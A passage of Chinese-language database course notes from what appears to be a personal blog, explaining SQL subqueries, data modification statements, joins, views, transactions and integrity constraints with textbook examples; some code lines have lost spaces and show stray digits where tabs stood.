class="line">select course_id</span><br><span class="line">from section</span><br><span class="line">where semester = ’Fall’ and year= 2009 and</span><br><span class="line">course_id in (select course_id</span><br><span class="line">              from section</span><br><span class="line">              where semester=’Spring’and year=2010);</span><br></pre></td></tr></table></figure><ul><li><strong>相关子查询：</strong>in后的子查询与外层查询无关，每个子查询执行一次，而exists后的子查询与外层查询有关，需要执行多次，称之为<strong>相关子查询</strong><ul><li>执行过程：<ul><li>首先取外层查询中表的第一个元组，根据它与内层查询相关的属性值处理内层查询，若WHERE子句返回值为真，则取此元组放入结果表</li><li>然后再取外层表的下一个元组</li><li>重复这一过程，直至外层表全部检查完为止</li></ul></li></ul></li></ul><h4 id="sql中全部概念的处理"><a href="#sql中全部概念的处理" class="headerlink" title="sql中全部概念的处理"></a>sql中全部概念的处理</h4><p>全部在sql中的三种写法</p><ul><li>∀：<code>not exists(not exists)</code></li><li>超集superset：<code>not exists(X except Y)</code></li><li>÷：<code>not in(not in)</code></li></ul><blockquote><ul><li>用EXISTS表示超集<ul><li>若A为B的超集，则<code>NOT EXISTS (B EXCEPT A)</code> 为TRUE</li><li>对于B EXCEPT A，可以表达为：在B中存在，但在A中不存在的记录，也可以用<code>NOT EXISTS</code> 来表达</li><li>因此超集可以用两个NOT EXISTS 的嵌套来表达，也可以用两个NOT IN 的嵌套来表达</li></ul></li></ul></blockquote><p><strong>巧用逆否命题的等价</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line"># 列出选修了全部课程的学生姓名</span><br><span class="line"></span><br><span class="line"># 任意课程，所求学生选之⇔不存在任何一门课程，所求学生没有选之</span><br><span class="line">selectSNAME</span><br><span class="line">fromS</span><br><span class="line">wherenot exists(select Cno</span><br><span class="line">                  from C</span><br><span class="line">                  where not exists(select *</span><br><span class="line">                                    from SC</span><br><span class="line">                                    where SC.Cno = C.Cno</span><br><span class="line">                                    and SC.Sno = S.Sno)) </span><br><span class="line">                                    </span><br><span class="line"></span><br><span class="line"># 任意课程，所求学生选之⇔所求学生的选课集合为所有课程集合的超集</span><br><span class="line">selectSNAME</span><br><span class="line">fromS</span><br><span class="line">wherenot exists((selectCno</span><br><span class="line">                   fromC)</span><br><span class="line">                  except (select Cno</span><br><span class="line">                           fromSC</span><br><span class="line">                           whereSC.Sno = S.Sno))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#任意课程，所求学生选之⇔所求学生不在如下集合中：学生学号与任一课程的组合不全包含在SC</span><br><span class="line">selectSNAME</span><br><span class="line">fromS</span><br><span class="line">whereSnonot in</span><br><span class="line">444(selectSno</span><br><span class="line">            fromC,S</span><br><span class="line">            where(Sno,Cno) not in</span><br><span class="line">            (select Sno,Cno</span><br><span class="line">                                    from SC))</span><br></pre></td></tr></table></figure><h4 id="测试没有重复的元组"><a href="#测试没有重复的元组" class="headerlink" title="测试没有重复的元组"></a>测试没有重复的元组</h4><p><code>unique</code>结构测试一个子查询的结果中是否有重复的元组，在空集中其值为<code>true</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line"># 找出所有2009年最多开设一次的课程</span><br><span class="line">select T.course_id</span><br><span class="line">from course T</span><br><span class="line">where unique (select R.course_id</span><br><span class="line">             from section R</span><br><span class="line">             where T.course_id = R.course_id and R.year = 2009)</span><br></pre></td></tr></table></figure><h4 id="from子句中的子查询"><a href="#from子句中的子查询" class="headerlink" title="from子句中的子查询"></a><code>from</code>子句中的子查询</h4><p>sql允许<code>from</code>子句中的子查询的表达式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line"># 找出系平均工资超过42000美元的那些系中教师的平均工资</span><br><span class="line">select dept_name, avg_salary</span><br><span class="line">from (select dept_name, avg (salary)  avg_salary</span><br><span class="line">      from instructor</span><br><span class="line">      group by dept_name)</span><br><span class="line">where avg_salary &gt; 42000;</span><br></pre></td></tr></table></figure><h4 id="with子句"><a href="#with子句" class="headerlink" title="with子句"></a><code>with</code>子句</h4><p><code>with</code>子句提供了定义<strong>临时关系</strong>的方法，这个定义支队包含with的子句的查询有效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line"># 找出具有最大预算值的系</span><br><span class="line">with max_budget (value) as</span><br><span class="line">4(select max(budget)</span><br><span class="line"> from department)</span><br><span class="line">select budget</span><br><span class="line">from department, max_budget</span><br><span class="line">where department.budget = max_budget.value;</span><br></pre></td></tr></table></figure><p>with子句在写复杂查询时非常有用</p><h4 id="标量子查询"><a href="#标量子查询" class="headerlink" title="标量子查询"></a>标量子查询</h4><p>SQL允许子查询出现在返回单个值的表达式能够出现的任何地方，只要该子查询只返回包含单个属性的单个元组；这样的子查询称为标量子查询（scalar subquery）</p><p>标量子查询只返回包含单个属性的单个元组</p><p>如果子查询的结果返回多个元组，则会产生运行错误</p><h3 id="数据库的修改"><a href="#数据库的修改" class="headerlink" title="数据库的修改"></a>数据库的修改</h3><ul><li>从一个给定的关系中删除元组：<code>delete from</code></li><li>向一个给定的关系插入新的元组：<code>insert into</code></li><li>将一个给定的关系的一些元组的值更新：<code>update</code></li></ul><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deletefromtable_name[where&lt;条件表达式&gt;]</span><br></pre></td></tr></table></figure><p>从表中删除符合条件的元组，如果没有<code>where</code>语句，则删除所有元组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line"># 删除 instructors 关系中的所有元组</span><br><span class="line">deletefrom instructor</span><br><span class="line"></span><br><span class="line"># 从 instructors 关系中删除与 Finance 系教师相关的所有元组</span><br><span class="line">deletefrominstructor</span><br><span class="line">4wheredept_name = &apos;Finance&apos;</span><br><span class="line"></span><br><span class="line">#从 instructor 关系中删除在位于 Watson 大楼的系工作的教师元组</span><br><span class="line">deletefrominstructor</span><br><span class="line">4wheredept_namein(selectdept_name</span><br><span class="line">                          fromdepartment</span><br><span class="line">                          wherebuilding = &apos;Watson&apos;)</span><br><span class="line"></span><br><span class="line"># 删除工资低于大学平均工资的教师记录</span><br><span class="line">deletefrom instructor</span><br><span class="line">4wheresalary&lt; (selectavg(salary)</span><br><span class="line">                       frominstructor)</span><br></pre></td></tr></table></figure><h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insertintotable_name[(col1 [,col2]...)]</span><br><span class="line">4values(val1 [,val2]...)</span><br></pre></td></tr></table></figure><p>插入一条指定好值的元组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insertintotable_name[(col1 [,col2]...)]</span><br><span class="line">44(子查询)</span><br></pre></td></tr></table></figure><p>插入子查询结果中的若干条元组</p><h5 id="into子句"><a href="#into子句" class="headerlink" title="into子句"></a><code>into</code>子句</h5><ul><li>指定要插入数据的表名及属性列</li><li>属性列的顺序可以与表定义中的顺序不一致</li><li>没有指定属性列：表示要插入的是一条完整的元组，且属性列属性与表定义中的顺序一致</li><li>指定部分属性列：插入的元组在其余属性列上取空值</li></ul><h5 id="values子句"><a href="#values子句" class="headerlink" title="values子句"></a><code>values</code>子句</h5><ul><li>提供的值必须与<code>into</code>子句匹配：值的个数&amp;&amp;值的类型</li></ul><h5 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h5><ul><li><code>select</code>子句目标列必须与<code>into</code>子句匹配：值的个数&amp;&amp;值的类型</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line"># 向 course 关系中插入新元组</span><br><span class="line">insert into course</span><br><span class="line">4values (‘CS-437’,‘Database Systems’,‘Comp. Sci.’, 4);</span><br><span class="line"></span><br><span class="line">insert into course (course_id, title, dept_name, credits)</span><br><span class="line">4values (‘CS-437’, ‘Database Systems’, ‘Comp. Sci.’, 4);</span><br><span class="line">4</span><br><span class="line"># 向 student 关系中插入新元组，并将tot_creds 属性设置为null</span><br><span class="line">insert into student</span><br><span class="line">4values (‘3003’, ‘Green’, ‘Finance’, null);</span><br><span class="line">4</span><br><span class="line"># 将instructor 关系中的所有元组插入到student 关系里，并将属性tol_credits设置为0</span><br><span class="line">insert into student</span><br><span class="line">4select ID, name, dept_name, 0</span><br><span class="line">4from   instructor</span><br></pre></td></tr></table></figure><ul><li><code>select from where</code> 语句在它的结果被插入到相应的关系之前就完成了评估，否则，像这样的查询  <code>insert into table1 select * from table1</code>，如果<em>table1</em>没有主码的话，会出现问题 </li></ul><h4 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">updatetable_name</span><br><span class="line">4setcol_name1 = 表达式|子查询</span><br><span class="line">44col_name2 = 表达式|子查询</span><br><span class="line">44...</span><br><span class="line">44[where 条件表达式]</span><br></pre></td></tr></table></figure><p>指定对哪些列进行更新，以及更新后的值是什么</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line"># 老师工资上调5%</span><br><span class="line">updatePROF</span><br><span class="line">4setSAL = SAL * 1.05</span><br><span class="line"></span><br><span class="line">#将d1系的学生年龄增加1岁</span><br><span class="line">updateStudent</span><br><span class="line">4setS_age = S_age + 1</span><br><span class="line">4where dno = &apos;d1&apos;</span><br><span class="line"></span><br><span class="line"># 将d1系全体学生的成绩置零</span><br><span class="line">update SC</span><br><span class="line">4setScore = 0</span><br><span class="line">4where &apos;d1&apos; = (select dno</span><br><span class="line">                 from S</span><br><span class="line">                 whereS.Sno = SC.Sno)</span><br><span class="line"></span><br><span class="line"># 将D01系系主任的工资改为该系的平均工资</span><br><span class="line">update PROF</span><br><span class="line">setSAL = (select avg(SAL)</span><br><span class="line">          fromPROF</span><br><span class="line">          whereDno = D01)</span><br><span class="line">4wherePno = (selectDEAN</span><br><span class="line">                  fromDEPT</span><br><span class="line">                  whereDno = D01)</span><br></pre></td></tr></table></figure><h5 id="为条件更新使用Case语句"><a href="#为条件更新使用Case语句" class="headerlink" title="为条件更新使用Case语句"></a>为条件更新使用<code>Case</code>语句</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line">updateinstructor</span><br><span class="line">4setsalary = case</span><br><span class="line">444whensalary &lt;= 100000 then salary * 1.05</span><br><span class="line">444elsesalary *1.03</span><br><span class="line">444end</span><br></pre></td></tr></table></figure><h5 id="使用标量子查询的更新"><a href="#使用标量子查询的更新" class="headerlink" title="使用标量子查询的更新"></a>使用标量子查询的更新</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line"># 为关系student重新计算并更新tot_credit属性的值</span><br><span class="line">updatestudent S</span><br><span class="line">4settot_credit=(selectsum(credits)</span><br><span class="line">                        fromtakesnatural join course</span><br><span class="line">                        whereS.ID = takes.ID and</span><br><span class="line">                        takes.grade &lt;&gt; &apos;F&apos; and</span><br><span class="line">                        takes.gradeis not null);</span><br><span class="line">                        </span><br><span class="line"># 如果一个学生没有成功学完任何一个课程，则将其tot_creds 属性设为空</span><br><span class="line"># 不使用sum(credits)，而是使用:</span><br><span class="line">4case</span><br><span class="line">44whensum(credits) is not null then sum(credits)</span><br><span class="line">444else 0</span><br><span class="line">444end</span><br></pre></td></tr></table></figure><h3 id="中级SQL"><a href="#中级SQL" class="headerlink" title="中级SQL"></a>中级SQL</h3><h4 id="连接表达式"><a href="#连接表达式" class="headerlink" title="连接表达式"></a>连接表达式</h4><h5 id="连接关系"><a href="#连接关系" class="headerlink" title="连接关系"></a>连接关系</h5><p>连接操作作用于两个关系并返回一个关系作为结果</p><p>一个连接操作是一个笛卡儿积，并且要求两个关系的元组满足某些匹配条件，他还指定在连接结果中要出现的属性</p><p><code>join</code>操作通常用作from子句中的子查询表达式</p><h5 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h5><ul><li><p>一个扩展的连接操作，避免了信息的损失</p></li><li><p>计算<code>join</code>，然后将一个关系中与另一个不匹配的元组添加到结果中</p></li><li><p>使用<code>null</code>值</p></li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/10.jpg" alt></p><p>对于该关系，我们有左外连接、右外连接、全外连接和内连接</p><p>左外连接如下：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/11.jpg" alt></p><p>右外连接如下：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/12.jpg" alt></p><p>简而言之，往哪连接，被连接的表的主码全部需要保留，然后将其连接的属性有则填入，无则赋<code>null</code></p><p>若找不到相应的主码，则将连接的表的那一行丢弃</p><p>全外连接如下：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/13.jpg" alt></p><ul><li><strong>连接操作</strong>将两个关系作为输入，返回一个关系作为结果</li><li><strong>连接条件</strong>：规定了这两个关系中的哪些元组匹配，以及在连接结果中出现了什么属性</li><li><strong>连接类型</strong>：规定了对每个关系中（基于连接条件）不与其他关系中的元组相匹配的元组怎样处理</li></ul><p>对于自然连接，会自动合并相同的列，但是连接会保留列</p><p>例子如下：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/14.jpg" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/15.jpg" alt></p><h4 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h4><p>在某些情况下，让所有的用户看到整个逻辑模型（即所有实际存储在数据库中的关系）是不可取的</p><p><strong>视图</strong>提供一个对某些用户从视图中隐藏某些数据的机制</p><p>任何不是逻辑模型的一部分，但作为虚关系对用户可见的关系称为<strong>视图</strong>。</p><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">createviewvas&lt;query expression&gt;</span><br></pre></td></tr></table></figure><p>其中，<code>&lt;query expression&gt;</code>可以是任何合法的SQL表达式，v表示视图名</p><p>一旦定义了一个视图，我们就可以用视图指代该视图生成的虚关系</p><p>定义视图时并不是由查询表达式的执行结果创造一个新关系，相反，<strong>一个视图的定义导致存储一个查询表达式</strong>，当该视图被使用时，他就被这个已存储的查询表达式<strong>替换</strong>（有点类似C++的宏定义）</p><h5 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h5><ul><li>虚表，是从一个或几个基本表（或视图）导出的关系</li><li>只存放视图的定义，不会出现数据冗余</li><li>基表中的数据发生变化，从视图中查询的数据也随之改变</li><li>查询时，视图名可以出现在任何关系名可以出现的地方</li></ul><h5 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h5><ul><li>视图(view) vs 派生查询(with)：<ul><li>视图存储在DB数据字典中，是数据库模式的一部分</li><li>with定义的派生关系，仅在所属的SQL有效，不属于DB模式</li></ul></li><li>视图(view) vs 表(table)：<ul><li>视图和表都是关系，都可以在SQL中直接应用</li><li>DB中存储表的模式定义和数据</li><li>DB中值存储视图的定义，不存视图的数据</li><li>视图数据实在使用视图时临时计算的</li><li>物化视图是提高计算的一种手段，结果等价于临时计算</li></ul></li><li>视图的作用：<ul><li>对外模式的支持</li><li>安全性、方便性</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line"># instructor关系的没有salary的属性视图</span><br><span class="line">createviewfacultyas</span><br><span class="line">444selectID,name,dept_name</span><br><span class="line">444frominstructor</span><br><span class="line">444</span><br><span class="line"># 找出Biology系的所有教师的姓名</span><br><span class="line">select name</span><br><span class="line">from faculty</span><br><span class="line">wheredept_name = &apos;Biology&apos;</span><br></pre></td></tr></table></figure><ul><li>视图的属性名缺省为子查询结果中的属性名，也可以是显式指明，在下列情况下，必须指明视图的所有列名：<ul><li>某个目标列式聚集函数或列表达式</li><li>多表连接时，选出了几个同名列作为视图的字段</li><li>需要在视图中为某个列启用新的更合适的名字</li><li>目标列是*</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line"># 定义一个每个系的工资总和的视图</span><br><span class="line">create viewdepartments_total_salary(dept_name, total_salary) as</span><br><span class="line">4selectdept_name, sum(salary)</span><br><span class="line">4frominstructor</span><br><span class="line">4group by dept_name</span><br></pre></td></tr></table></figure><h5 id="使用其他视图定义视图"><a href="#使用其他视图定义视图" class="headerlink" title="使用其他视图定义视图"></a>使用其他视图定义视图</h5><p>一个视图可以用于定义另一个视图的表达式中</p><p>如果一个视图关系v2用于定义另一个视图关系v1的表达式中，则称<strong>v1直接依赖于v2</strong></p><p>如果一个视图关系v1直接依赖于另一个视图v2，或通过其他视图间接依赖于v2，则称<strong>v1依赖于v2</strong></p><p>一个视图关系如果依赖于它自身，则被称为递归的</p><h5 id="视图扩展"><a href="#视图扩展" class="headerlink" title="视图扩展"></a>视图扩展</h5><p>一种通过其他视图的定义来定义视图含义的方法</p><p>设视图v1由表达式e1定义的，可能它本身就包含对视图关系的使用</p><p>一个表达式中的视图扩展重复以下替换步骤</p><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> repeat</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 找到e1中的关系vi</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 使用定义vi的表达式替换vi</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> until在e1中没有视图关系</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure></blockquote><p>是要视图不是递归的，循环就能终止</p><h5 id="视图更新"><a href="#视图更新" class="headerlink" title="视图更新"></a>视图更新</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">updateview_name</span><br><span class="line">setcol = val</span><br><span class="line">whereexpression</span><br><span class="line"></span><br><span class="line">deletefromview_name</span><br><span class="line">whereexpression</span><br></pre></td></tr></table></figure><p>视图的更新就是转换为表的更新</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line">createviewIS_Studentas</span><br><span class="line">4selectSno,Sname,Sage</span><br><span class="line">4fromStudent</span><br><span class="line">4whereSdept = &apos;IS&apos;;</span><br><span class="line">4</span><br><span class="line">#update</span><br><span class="line">updateIS_Student</span><br><span class="line">setSname = &apos;Alice&apos;</span><br><span class="line">whereSno = &apos;12315&apos;</span><br><span class="line"></span><br><span class="line">#transferTo</span><br><span class="line">updateStudent</span><br><span class="line">set Sname = &apos;Alice&apos;</span><br><span class="line">whereSno = &apos;12315&apos;andSdept = &apos;IS&apos;;</span><br><span class="line"></span><br><span class="line">#insert</span><br><span class="line">insertintoIS_Student</span><br><span class="line">4values(&apos;12306&apos;, &apos;Bob&apos;, 18)</span><br><span class="line"></span><br><span class="line">#transferTo</span><br><span class="line">insertintoStudnet(Sno,Sname,Sage,Sdept)</span><br><span class="line">4values(&apos;12306&apos;,&apos;Bob&apos;,18,&apos;IS&apos;)</span><br><span class="line">4</span><br><span class="line"></span><br><span class="line">#delete</span><br><span class="line">deletefromIS_Student</span><br><span class="line">whereSno = &apos;12315&apos;</span><br><span class="line"></span><br><span class="line">#transferTo</span><br><span class="line">deletefrom Student</span><br><span class="line">whereSno = &apos;12315&apos;andSdept = &apos;IS&apos;</span><br></pre></td></tr></table></figure><p>有些更新不能被单独执行，大部分的SQL实现只允许在简单视图上的更新（①<code>from</code>子句中只有一个数据库关系；②<code>select</code>子句中只包含关系的属性名，不包含任何表达式、聚集函数或<code>distinct</code>声明；③任何没有出现<code>select</code>子句中的属性可以取空值；④查询中不含有<code>group by</code>或<code>having</code>子句）</p><p>对于行列子集视图可以更新</p><h5 id="with-check-option"><a href="#with-check-option" class="headerlink" title="with check option"></a><code>with check option</code></h5><ul><li>视图定义时，指定<code>with check option</code>，强制通过视图进行的修改，结果必须在视图中。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">SnoSnameSageDept</span><br><span class="line">S1A21C</span><br><span class="line">S4B20C</span><br><span class="line">S2C19S</span><br><span class="line">s3D21S</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">createview sv1as</span><br><span class="line">4selectsno,sname,sagefroms</span><br><span class="line">44whereDept = &apos;C&apos;andsage&gt;20</span><br><span class="line"></span><br><span class="line">updatesv1setsage=19wheresno = &apos;s4&apos;</span><br><span class="line"># 更以更新,更新后,B不再出现在视图中</span><br><span class="line"></span><br><span class="line">createview sv1as</span><br><span class="line">4selectsno,sname,sagefroms</span><br><span class="line">44whereDept = &apos;C&apos;andsage&gt;20</span><br><span class="line">4with checkoption;</span><br><span class="line"></span><br><span class="line">updatesv1setsage=19wheresno = &apos;s4&apos;</span><br><span class="line"># 不可以更新,update语句将被DBMS拒绝</span><br></pre></td></tr></table></figure><h5 id="物化视图"><a href="#物化视图" class="headerlink" title="物化视图"></a>物化视图</h5><p>定义：创建一个物理表，此表包含定义视图的查询结果的所有元组</p><p>如果查询中使用的关系发生了更新，则物化视图中的结果就会过期</p><p>每当视图的底层关系进行更新时要更新视图，以此<strong>维护</strong>视图</p><h4 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h4><ul><li>工作单元</li><li><strong>原子事务</strong>：<strong>要么全部执行，要么回滚</strong>，好像没有发生一样</li><li>从并发事务中隔离</li><li>隐式地开始一个任务<ul><li>以<code>commit    work</code>    或    <code>rollback    work</code>结束</li></ul></li><li>多数数据库的默认情况：每个SQL语句自动提交<ul><li>可以关闭自动提交了一个会话</li><li>在SQL:1999里可以使用<code>begin atomic ... end</code>（但这种方式不被多数数据库支持）</li></ul></li></ul><h4 id="完整性约束"><a href="#完整性约束" class="headerlink" title="完整性约束"></a>完整性约束</h4><ul><li>完整性约束通过保证对数据库的修改不会造成数据的不一致，来防止对数据库数据的意外破坏</li></ul><blockquote><p>单个关系上的约束</p><ul><li><strong>not null</strong>：指定的属性上，不允许出现空值<ul><li>限制：任何试图导致某个或某些元组非空属性为空的操作都将被拒绝</li></ul></li><li><strong>primary key</strong>：声明为主码<ul><li>主码值不允许为空，也不允许出现重复</li><li>意义：关系对应到现实世界中的实体集，元组对应到实体，实体是相互可区分的，通过主码来唯一标识，若主码为空，则出现不可标识的实体，这是不容许的</li></ul></li><li><strong>unique</strong>：声明候选码<ul><li>约束：不允许关系中，有两个元组在指定属性上取值相同</li><li>unique本身不限定属性非空</li></ul></li><li><strong>check(P)</strong>，P是一个谓词<ul><li>约束：关系上的每一个元组，都必须满足P</li><li>check可以针对一个或多个属性</li><li>check可以涉及其他表，但需考虑约束检查条件代价</li></ul></li></ul></blockquote><p>对于check，我们有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 保证semester必须是四季即Spring,Summer,Fall,Winter中的一个</span><br><span class="line">create table section (</span><br><span class="line">    course_id varchar (8),</span><br><span class="line">    sec_id varchar (8),</span><br><span class="line">    semester varchar (6),</span><br><span class="line">    year numeric (4,0),</span><br><span class="line">    building varchar (15),</span><br><span class="line">    room_number varchar (7),</span><br><span class="line">    time slot id varchar (4), </span><br><span class="line">    primary key (course_id, sec_id, semester, year),</span><br><span class="line">    check (semester in(‘Fall’,‘Winter’,‘Spring’,‘Summer’))</span><br></pre></td></tr></table></figure><h5 id="参照完整性"><a href="#参照完整性" class="headerlink" title="参照完整性"></a>参照完整性</h5><p>保证在一个关系中给定属性集上的取值也在另一关系的特定属性集的取值中出现</p><p>A是一个属性的集合，R和S是两个包含属性A的关系，并且A是S的主码，如果对于每个而在R中出现的A在S中也出现，则A被称为R的<strong>外码</strong></p><h5 id="参照完整性的级联行为"><a href="#参照完整性的级联行为" class="headerlink" title="参照完整性的级联行为"></a>参照完整性的级联行为</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 